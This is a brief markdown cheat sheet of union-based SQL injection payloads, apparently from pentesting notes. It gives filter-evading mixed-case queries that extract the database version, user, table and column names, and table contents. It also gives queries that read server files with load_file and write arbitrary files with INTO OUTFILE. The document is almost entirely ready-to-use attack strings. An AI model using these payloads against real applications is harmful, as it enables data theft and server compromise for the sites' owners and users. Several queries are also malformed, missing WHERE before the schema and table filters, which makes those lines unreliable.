# Union SQLi queries

Assuming there are 2 columns and comlumn 2 can be used to display data on screen.

## General SELECT syntax

    UniOn selEct [number of columns] [comment]

## Examples

Seleting database version:

    UniOn selEct 1,version() /*

Database:

    UniOn selEct 1,database() /*

Database user:

    UniOn selEct 1,user() /*

Database tables:

    UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*

Table Columns:

    UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*

Selecting data from table:

    UniOn selEct 1,[column name] frOm [table name] /*

Reading files:

    UniOn selEct 1,load_file('file location') /*

Writing files:

    UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*

## Resources

* [SQL UNION](https://www.sqltutorial.org/sql-union/)